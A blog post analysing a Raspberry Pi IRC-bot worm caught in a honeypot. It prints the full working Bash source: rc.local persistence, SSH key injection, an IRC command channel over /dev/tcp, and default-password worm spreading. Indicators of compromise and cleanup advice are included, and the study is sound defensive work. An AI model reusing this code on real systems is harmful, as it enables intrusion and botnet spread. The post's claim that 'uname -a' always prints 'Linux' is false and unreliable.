<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Fishing for Malware — Part Four: Raspberry Pi IRC Bot | Sid's Blog</title>
<meta name=keywords content="sid,lacy,blog,website,cybersecurity,security,computer,honeypot,malware,tech,network,raspberry,pi">
<meta name=description content="Analysis of malware dropped into my Google Cloud honeypot – fun with Bash on R. Pi">
<meta name=author content="Sid Lacy">
<link rel=canonical href=https://swlacy.com/posts/fishing-for-malware-4/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.57f2b6dfb92097eb855e02e905de3644361ad2fc5089352e89b93d9a43712dd5.css integrity="sha256-V/K237kgl+uFXgLpBd42RDYa0vxQiTUuibk9mkNxLdU=" rel="preload stylesheet" as=style>
<link rel=preload href=apple-touch-icon.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://swlacy.com/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://swlacy.com/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://swlacy.com/favicon-32x32.png>
<link rel=apple-touch-icon href=https://swlacy.com/apple-touch-icon.png>
<link rel=mask-icon href=https://swlacy.com/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.92.2">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-QFRYSRDLC1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-QFRYSRDLC1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="Fishing for Malware — Part Four: Raspberry Pi IRC Bot">
<meta property="og:description" content="Analysis of malware dropped into my Google Cloud honeypot – fun with Bash on R. Pi">
<meta property="og:type" content="article">
<meta property="og:url" content="https://swlacy.com/posts/fishing-for-malware-4/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-01-28T00:00:00+00:00">
<meta property="article:modified_time" content="2022-01-28T00:00:00+00:00"><meta property="og:site_name" content="Sid's Blog">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Fishing for Malware — Part Four: Raspberry Pi IRC Bot">
<meta name=twitter:description content="Analysis of malware dropped into my Google Cloud honeypot – fun with Bash on R. Pi">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://swlacy.com/posts/"},{"@type":"ListItem","position":3,"name":"Fishing for Malware — Part Four: Raspberry Pi IRC Bot","item":"https://swlacy.com/posts/fishing-for-malware-4/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Fishing for Malware — Part Four: Raspberry Pi IRC Bot","name":"Fishing for Malware — Part Four: Raspberry Pi IRC Bot","description":"Analysis of malware dropped into my Google Cloud honeypot – fun with Bash on R. Pi","keywords":["sid","lacy","blog","website","cybersecurity","security","computer","honeypot","malware","tech","network","raspberry","pi"],"articleBody":"⇤ Start from the beginning\nWhile dissecting binaries using Ghidra, Strings, and Hexdump makes for a fun puzzle in itself, it’s also fascinating to inspect the raw source code of malware. Cowrie, a Telnet and SSH honeypot with emulates a Unix environment packaged within T-Pot, captured quite the interesting Bash script, which includes a variety of malicious elements specifically designed for the Raspberry Pi platform.\nInformation Purpose: installation of TCP backdoor on Linux; accepts commands via IRC channel #biret.\nIndicators of Compromise  MD5: 182be4e7136619107ae4c41601d43118 SHA-1: b06060d90decfa5bb90f379a17f34699fae7ad6f SHA-256: 7d031312baf7d28ccb1bbf7598c368f29b33c88e650e22e115d02b308f0b6491 Connected domains:  ix1.undernet.org ix2.undernet.org Ashburn.Va.Us.UnderNet.org Bucharest.RO.EU.Undernet.Org Budapest.HU.EU.UnderNet.org Chicago.IL.US.Undernet.org bins.deutschland-zahlung.eu   Unexpected TCP connections on port 6667 Entry for XXXXXXXX, where X represents any ASCII char, in /opt or in /etc/rc.local Public key matching the following:  SSH: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B SSL: MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF WRq+Z8HYMvPlgSRA3wIDAQAB   Unexpected password change on local user account pi Unexpected installaton of packages zmap, sshpass Proccess running from /tmp using nohup  File  Magic: plain ASCII Language: Bash Size: 4.65 KB  Source Code C0755 4745 nC9qy0wv #!/bin/bash MYSELF=`realpath $0` DEBUG=/dev/null echo $MYSELF  $DEBUG if [ \"$EUID\" -ne 0 ] then NEWMYSELF=`mktemp -u 'XXXXXXXX'` sudo cp $MYSELF /opt/$NEWMYSELF sudo sh -c \"echo '#!/bin/sh -e'  /etc/rc.local\" sudo sh -c \"echo /opt/$NEWMYSELF /etc/rc.local\" sudo sh -c \"echo 'exit 0'  /etc/rc.local\" sleep 1 sudo reboot else TMP1=`mktemp` echo $TMP1  $DEBUG killall bins.sh killall minerd killall node killall nodejs killall ktx-armv4l killall ktx-i586 killall ktx-m68k killall ktx-mips killall ktx-mipsel killall ktx-powerpc killall ktx-sh4 killall ktx-sparc killall arm5 killall zmap killall kaiten killall perl echo \"127.0.0.1 bins.deutschland-zahlung.eu\"  /etc/hosts rm -rf /root/.bashrc rm -rf /home/pi/.bashrc usermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi mkdir -p /root/.ssh echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B\"  /root/.ssh/authorized_keys echo \"nameserver 8.8.8.8\"  /etc/resolv.conf rm -rf /tmp/ktx* rm -rf /tmp/cpuminer-multi rm -rf /var/tmp/kaiten cat  /tmp/public.pem -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF WRq+Z8HYMvPlgSRA3wIDAQAB -----END PUBLIC KEY----- EOFMARKER BOT=`mktemp -u 'XXXXXXXX'` cat  /tmp/$BOT #!/bin/bash SYS=`uname -a | md5sum | awk -F' ' '{print $1}'` NICK=a${SYS:24} while [ true ]; do arr[0]=\"ix1.undernet.org\" arr[1]=\"ix2.undernet.org\" arr[2]=\"Ashburn.Va.Us.UnderNet.org\" arr[3]=\"Bucharest.RO.EU.Undernet.Org\" arr[4]=\"Budapest.HU.EU.UnderNet.org\" arr[5]=\"Chicago.IL.US.Undernet.org\" rand=$[$RANDOM % 6] svr=${arr[$rand]} eval 'exec 3/dev/tcp/$svr/6667;' if [[ ! \"$?\" -eq 0 ]] ; then continue fi echo $NICK eval 'printf \"NICK $NICK\\r\\n\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then continue fi eval 'printf \"USER user 8 * :IRC hi\\r\\n\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then continue fi # Main loop while [ true ]; do eval \"read msg_in if [[ ! \"$?\" -eq 0 ]] ; then break fi if [[ \"$msg_in\" =~ \"PING\" ]] ; then printf \"PONG %s\\n\" \"${msg_in:5}\"; eval 'printf \"PONG %s\\r\\n\" \"${msg_in:5}\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then break fi sleep 1 eval 'printf \"JOIN #biret\\r\\n\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then break fi elif [[ \"$msg_in\" =~ \"PRIVMSG\" ]] ; then privmsg_h=$(echo $msg_in| cut -d':' -f 3) privmsg_data=$(echo $msg_in| cut -d':' -f 4) privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1) hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'` sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin` if [[ \"$sign\" == \"$hash\" ]] ; then CMD=`echo $privmsg_data | base64 -d -i` RES=`bash -c \"$CMD\" | base64 -w 0` eval 'printf \"PRIVMSG $privmsg_nick :$RES\\r\\n\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then break fi fi fi done done EOFMARKER chmod +x /tmp/$BOT nohup /tmp/$BOT 2\u00261  /tmp/bot.log \u0026 rm /tmp/nohup.log -rf rm -rf nohup.out sleep 3 rm -rf /tmp/$BOT NAME=`mktemp -u 'XXXXXXXX'` date  /tmp/.s apt-get update -y --force-yes apt-get install zmap sshpass -y --force-yes while [ true ]; do FILE=`mktemp` zmap -p 22 -o $FILE -n 100000 killall ssh scp for IP in `cat $FILE` do sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026\u0026 echo $IP  /opt/.r \u0026\u0026 sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \"cd /tmp \u0026\u0026 chmod +x $NAME\u0026\u0026 bash -c ./$NAME\" \u0026 sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026\u0026 echo $IP  /opt/.r \u0026\u0026 sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \"cd /tmp \u0026\u0026 chmod +x $NAME\u0026\u0026 bash -c ./$NAME\" \u0026 done rm -rf $FILE sleep 10 done fi Annotated Breakdown Okay — there is a lot to unpack here. Let’s proceed chronologically down the length of the script.\nHead MYSELF=`realpath $0` # Find my location DEBUG=/dev/null echo $MYSELF  $DEBUG realpath is part of the GNU coreutils; it resolves the location of an entity in the filesystem while resolving all references and links. The functionality of pwd, in most cases, may be thought of as a subset of realpath in that respect. The above code is used to determine where the script itself resides upon execution.\nPrivilege Escalation if [ \"$EUID\" -ne 0 ] # If not running as root (or under sudo/doas) then NEWMYSELF=`mktemp -u 'XXXXXXXX'` # Generate a pseudorandom string 8 chars long sudo cp $MYSELF /opt/$NEWMYSELF # Copy this script to /opt with the name geenrated above sudo sh -c \"echo '#!/bin/sh -e'  /etc/rc.local\" # Start sh on boot... sudo sh -c \"echo /opt/$NEWMYSELF /etc/rc.local\" # ...So that this script can also be executed on boot sudo sh -c \"echo 'exit 0'  /etc/rc.local\" # Stop whatever else may come afterwards sleep 1 sudo reboot #Reboot so that the script may take effect *running as ROOT* else TMP1=`mktemp` echo $TMP1  $DEBUG This is a fantastic example of simple privilege escalation! The EUID is first checked — an EUID of zero indicates that the current privilege level is root, by way of actually running as the root account or elevation via sudo or doas. Not running as root presents issues for this script; the following steps are executed if so:\n Generate a random string with mktemp. Copy the script to /opt using the generated string as the filename. Append sh (shell) and the script to /etc/rc.local, which will be executed on boot as root, thereby running the script as root. Reboot.  Quite creative.\nKilling Processes killall bins.sh killall minerd killall node killall nodejs killall ktx-armv4l killall ktx-i586 killall ktx-m68k killall ktx-mips killall ktx-mipsel killall ktx-powerpc killall ktx-sh4 killall ktx-sparc killall arm5 killall zmap killall kaiten killall perl The script then kills the processes shown above. zmap, a network scanner, seems reasonable to stop (with malicious intent), but I’m not sure why the attacker chose to stop the others, which are oddly specific. Perhaps to save resources?\nCleaning Bash Profiles; Changing Account Password echo \"127.0.0.1 bins.deutschland-zahlung.eu\"  /etc/hosts # Classic malicious domain rm -rf /root/.bashrc # Clearing Bash customization from the root account rm -rf /home/pi/.bashrc # Clearing Bash customization from the... pi account? Raspberry Pi? # Changing the password of the pi account (encrypted) usermod -p \\$6\\$vGkGPKUr\\$heqvOhUzvbQ66Nb0JGCijh/81sG1WACcZgzPn8A0Wn58hHXWqy5yOgTlYJEbOjhkHD0MRsAkfJgjU/ioCYDeR1 pi This section provides some much-needed insight: the assumption of the pi account implies that this script must be designed for use on Raspberry Pi devices! This may also explain killing the processes above — Node, for example, is a common application run on Rasberry Pi computers for development work.\nInjecting SSH key mkdir -p /root/.ssh echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl0kIN33IJISIufmqpqg54D6s4J0L7XV2kep0rNzgY1S1IdE8HDef7z1ipBVuGTygGsq+x4yVnxveGshVP48YmicQHJMCIljmn6Po0RMC48qihm/9ytoEYtkKkeiTR02c6DyIcDnX3QdlSmEqPqSNRQ/XDgM7qIB/VpYtAhK/7DoE8pqdoFNBU5+JlqeWYpsMO+qkHugKA5U22wEGs8xG2XyyDtrBcw10xz+M7U8Vpt0tEadeV973tXNNNpUgYGIFEsrDEAjbMkEsUw+iQmXg37EusEFjCVjBySGH3F+EQtwin3YmxbB9HRMzOIzNnXwCFaYU5JjTNnzylUBp/XB6B\"  /root/.ssh/authorized_keys Here’s another interesting section — the script appends the public SSH key of the attacker to provide for remote access! Let this serve as a reminder to always audit authorized_keys. Google, for example, prevents this attack from occurring on their Cloud Compute VMs by running a service that periodically resets authorized_keys to a version that only includes keys explicitly defined in the VM metadata.\nRemoving Malware? echo \"nameserver 8.8.8.8\"  /etc/resolv.conf rm -rf /tmp/ktx* rm -rf /tmp/cpuminer-multi rm -rf /var/tmp/kaiten As far as I can tell, the directories removed in the code above belong to (potentially malicious) crypto miners. Therefore, it seems that this malware is cleaning up the processes of other malware. How kind of the script author.\nThe DNS entry ensures connectivity to the attacker by using a common host (Google). This malware otherwise would might not function on networks such as my own, as I run a personal DNS server with many malicious and otherwise undesired domains blocked.\nStoring a Public Key cat  /tmp/public.pem -----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/ihTe2DLmG9huBi9DsCJ90MJs glv7y530TWw2UqNtKjPPA1QXvNsWdiLpTzyvk8mv6ObWBF8hHzvyhJGCadl0v3HW rXneU1DK+7iLRnkI4PRYYbdfwp92nRza00JUR7P4pghG5SnRK+R/579vIiy+1oAF WRq+Z8HYMvPlgSRA3wIDAQAB -----END PUBLIC KEY----- EOFMARKER A public key is then placed within /tmp/public.pem, presumably to allow for simple remote access by another service (?).\nEmbedded IRC Script So far, a lot of preliminary steps have been taken to prepare the target environment for attack. It is here, within an infinite while loop, that the attack finally occurs.\nHead BOT=`mktemp -u 'XXXXXXXX'` # Generates another pseudorandom string for the file name below cat  /tmp/$BOT R' #!/bin/bash ... Setting a system name ... SYS=`uname -a | md5sum | awk -F' ' '{print $1}'` # Gets a hash of the system name NICK=a${SYS:24} # Sets a nickname ... Frankly, this section strikes me as dumb misguided (kindly pass on my most sincere apologies to the script author). Here is why: except for a few edge cases, the vast majority of Raspberry Pi devices run Linux. On Linux, uname -a always returns the same string:\n$ uname -a Linux So, the SYS variable assignment command does the following:\n Execute uname -a, which will almost always return the same “Linux” string. Pipe “Linux” into md5sum, which will always return the “638dd9cda411c1f92e831eeb14780a67”.  Since the hash is the same every time, NICK=a${SYS:24} will set the nickname variable to the string “a14780a67” at least 99 percent of the time. So, what is the point of setting a nickname to the same string on every target device? I’m not sure — for that, we would have to tap into the infinite wisdom of the script author.\nMapping IRC Servers ... while [ true ]; do # Servers arr[0]=\"ix1.undernet.org\" arr[1]=\"ix2.undernet.org\" arr[2]=\"Ashburn.Va.Us.UnderNet.org\" arr[3]=\"Bucharest.RO.EU.Undernet.Org\" arr[4]=\"Budapest.HU.EU.UnderNet.org\" arr[5]=\"Chicago.IL.US.Undernet.org\" # Chooses a pseudorandom server rand=$[$RANDOM % 6] svr=${arr[$rand]} # Check if an established TCP connection exists between host and server eval 'exec 3/dev/tcp/$svr/6667;' # Also, set new FD (3) if [[ ! \"$?\" -eq 0 ]] ; then continue # Skip back to the top of the loop if a connection already exists # NO `sleep` statement here... will check endlessly as fast as possible; silly fi ... It appears that this bot uses the UnderNet IRC system to establish connections with. Let’s take a look at UnderNet— perhaps we can find IRC channels (specifically #biret) related to this malware. For reference, #biret is the channel that this script initiates connections to.\nSigh. IRC… A relic that is perhaps best forgotten in some aspects. Two other users, which I have deliberately not shown here, are active at the time of writing this post in #biret. In fact, one of the active users has the name of a compromised target device!\nMain Logic ... echo $NICK eval 'printf \"NICK $NICK\\r\\n\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then continue fi eval 'printf \"USER user 8 * :IRC hi\\r\\n\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then continue fi # Main loop while [ true ]; do eval \"read msg_in  // Examine the contents of msg_in recieved from the TCP host-IRC connection # If msg_in is null, quit the main loop if [[ ! \"$?\" -eq 0 ]] ; then break fi # On IRC in = 'PING', respond 'PONG' via IRC # Presumably to test connectivity? if [[ \"$msg_in\" =~ \"PING\" ]] ; then printf \"PONG %s\\n\" \"${msg_in:5}\"; eval 'printf \"PONG %s\\r\\n\" \"${msg_in:5}\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then break fi sleep 1 // If msg_in is null, quit the main loop eval 'printf \"JOIN #biret\\r\\n\" \u00263;' if [[ ! \"$?\" -eq 0 ]] ; then break fi # `=~` is a bash regex operator which searches for 'PRIVMSG' within $msg_in # So, if 'PRIVMSG' is somewhere within $msg_in, continue elif [[ \"$msg_in\" =~ \"PRIVMSG\" ]] ; then # Cut $msg_in, extracting the relevant elements: # - A section to be hashed # - A data section containing instructions # - The IRC nickname of the host privmsg_h=$(echo $msg_in| cut -d':' -f 3) privmsg_data=$(echo $msg_in| cut -d':' -f 4) privmsg_nick=$(echo $msg_in| cut -d':' -f 2 | cut -d'!' -f 1) # Get an MD5 hash of the data from $msg_in # Use $privmsg_h to sign the public key generated earlier # Use: Ensure attacks come from the original attacker hash=`echo $privmsg_data | base64 -d -i | md5sum | awk -F' ' '{print $1}'` sign=`echo $privmsg_h | base64 -d -i | openssl rsautl -verify -inkey /tmp/public.pem -pubin` # If the sign is genuine (signed with the attackers public key) if [[ \"$sign\" == \"$hash\" ]] ; then CMD=`echo $privmsg_data | base64 -d -i` // Then grab the command to execute RES=`bash -c \"$CMD\" | base64 -w 0` eval 'printf \"PRIVMSG $privmsg_nick :$RES\\r\\n\" \u00263;' // Echo command back to attacker? # If msg_in is null, quit the main loop if [[ ! \"$?\" -eq 0 ]] ; then break fi fi fi done done EOFMARKER ... The main execution loop has several interesting elements. Essentially, the attacker establishes communication with the victim host via IRC and signs their attacks to ensure no other malicious actor can take advantage of the exploit. Very creative — this is likely also why no commands I sent to victim hosts in #biret responded to requests.\n... chmod +x /tmp/$BOT # Makes script executable so that it can run on other systems nohup /tmp/$BOT 2\u00261  /tmp/bot.log \u0026 # Ensures that the script is not stopped upon user logoff or any other hang events # Clean traces rm /tmp/nohup.log -rf rm -rf nohup.out sleep 3 rm -rf /tmp/$BOT # Generate a new name NAME=`mktemp -u 'XXXXXXXX'` date  /tmp/.s # Install: # - ZMap: a network scanner # - sshpass: a utility that allows for keyboard-interactive SSH sessions in non-interactive (automated) sessions apt-get update -y --force-yes apt-get install zmap sshpass -y --force-yes # SPREAD LOOP while [ true ]; do FILE=`mktemp` # Collect all IPs with port 22 open zmap -p 22 -o $FILE -n 100000 killall ssh scp for IP in `cat $FILE` # For each IP with 22 open, attempt to log in awith the credential set pi:praspberry # If a connection succeeds: # SPREAD AND EXECUTE THE SCRIPT do sshpass -praspberry scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026\u0026 echo $IP  /opt/.r \u0026\u0026 sshpass -praspberry ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \"cd /tmp \u0026\u0026 chmod +x $NAME\u0026\u0026 bash -c ./$NAME\" \u0026 sshpass -praspberryraspberry993311 scp -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $MYSELF pi@$IP:/tmp/$NAME \u0026\u0026 echo $IP  /opt/.r \u0026\u0026 sshpass -praspberryraspberry993311 ssh pi@$IP -o ConnectTimeout=6 -o NumberOfPasswordPrompts=1 -o PreferredAuthentications=password -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no \"cd /tmp \u0026\u0026 chmod +x $NAME\u0026\u0026 bash -c ./$NAME\" \u0026 done rm -rf $FILE // Clean traces sleep 10 done fi And here we have the finale: as with so many other malicious binaries, it attempts to spread where it can, trying to infect any unsecured Raspberry Pi on the local network. For a user with many new Raspberry Pis, I imagine this attack would prove very effective, netting many hosts.\nConclusion This was certainly an interesting script to behold. From the methodology employed by the attacker to control remote machines to the attack signing, it is evident that significant thought went into the development of this script. I would love the opportunity to anonymously interview the attacker… How many hosts were infected? Were infected hosts primarily useless, residential hobby computers? Was it possible to pivot from infected Raspberry pis to more important targets? Abstracting the unethicality of the development of malware, the creativity demonstrated here is remarkable and has made for quite an engaging learning experience.\nNote: I do not condone the development or distribution of malware outside of educational contexts.\n What should I do if I find this script on my Raspberry Pi?\n Immediately disconnect the device from the network and eject the storage medium. Mount it on an external device, back up any needed data, and then wipe all data. Reinstall the OS as normal. Do not attempt to manually remove the malware, as there is no reliable record of extra steps the attacker may have taken.\n What can we learn from this attack?\n Always, always, always secure services and minimize service visibility on the Internet. This attack would not function without the ability to deposit itself onto a host. Further, change default passwords for every account and service, even those not used. This script takes advantage of negligence in that regard, searching for hosts with the default Rasberry Pi credentials to pivot to.\nStay safe online, and thank you so much for reading.\n Fishing for Malware: Part 5 →\n← Fishing for Malware: Part 3\nI am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","wordCount":"2829","inLanguage":"en","datePublished":"2022-01-28T00:00:00Z","dateModified":"2022-01-28T00:00:00Z","author":[{"@type":"Person","name":"Sid Lacy"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://swlacy.com/posts/fishing-for-malware-4/"},"publisher":{"@type":"Organization","name":"Sid's Blog","logo":{"@type":"ImageObject","url":"https://swlacy.com/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add('dark')</script>
<header class=header>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/base16/espresso.min.css integrity="sha512-Alf9gBIx7O9Pn9+n7HJXcwZK6uXCaGDNj5ScAAtNsQ5OpUHBaXLEAaX00Z9N8S9o9lTG7FKgnRB5eXwUQKNu6g==" crossorigin=anonymous referrerpolicy=no-referrer>
<nav class=nav>
<div class=logo>
<a href=https://swlacy.com accesskey=h title=Home>
<img src=https://swlacy.com/apple-touch-icon.png alt=logo aria-label=logo height=" 21px">Sid's Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="Toggle Dark Mode"><svg id="moon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="moon" class="svg-inline--fa fa-moon" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg><svg id="sun" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="sun" class="svg-inline--fa fa-sun" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://swlacy.com/posts title=Search>
<span>Blog</span>
</a>
</li>
<li>
<a href=https://swlacy.com/documents title=Search>
<span>Docs</span>
</a>
</li>
<li>
<a href=https://swlacy.com/resume title=Search>
<span>Resume</span>
</a>
</li>
<li>
<a href=https://swlacy.com/about title=Search>
<span>About</span>
</a>
</li>
<li>
<a href=https://swlacy.com/archive title=Search>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://swlacy.com/search title=Search accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://swlacy.com>Home</a>&nbsp;»&nbsp;<a href=https://swlacy.com/posts/>Posts</a></div>
<h1 class=post-title>
Fishing for Malware — Part Four: Raspberry Pi IRC Bot
</h1>
<div class=post-description>
Analysis of malware dropped into my Google Cloud honeypot – fun with Bash on R. Pi
</div>
<div class=post-meta><span title="2022-01-28 00:00:00 +0000 UTC">January 28, 2022</span>&nbsp;·&nbsp;14 Minute Read&nbsp;·&nbsp;Sid Lacy
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#information aria-label=Information>Information</a><ul>
<li>
<a href=#indicators-of-compromise aria-label="Indicators of Compromise">Indicators of Compromise</a></li>
<li>
<a href=#file aria-label=File>File</a></li></ul>
</li>
<li>
<a href=#source-code aria-label="Source Code">Source Code</a></li>
<li>
<a href=#annotated-breakdown aria-label="Annotated Breakdown">Annotated Breakdown</a><ul>
<li>
<a href=#head aria-label=Head>Head</a></li>
<li>
<a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a></li>
<li>
<a href=#killing-processes aria-label="Killing Processes">Killing Processes</a></li>
<li>
<a href=#cleaning-bash-profiles-changing-account-password aria-label="Cleaning Bash Profiles; Changing Account Password">Cleaning Bash Profiles; Changing Account Password</a></li>
<li>
<a href=#injecting-ssh-key aria-label="Injecting SSH key">Injecting SSH key</a></li>
<li>
<a href=#removing-malware aria-label="Removing Malware?">Removing Malware?</a></li>
<li>
<a href=#storing-a-public-key aria-label="Storing a Public Key">Storing a Public Key</a></li>
<li>
<a href=#embedded-irc-script aria-label="Embedded IRC Script">Embedded IRC Script</a><ul>
<li>
<a href=#head-1 aria-label=Head>Head</a></li>
<li>
<a href=#setting-a-system-name aria-label="Setting a system name">Setting a system name</a></li>
<li>
<a href=#mapping-irc-servers aria-label="Mapping IRC Servers">Mapping IRC Servers</a></li>
<li>
<a href=#main-logic aria-label="Main Logic">Main Logic</a></li></ul>
</li></ul>
</li>
<li>
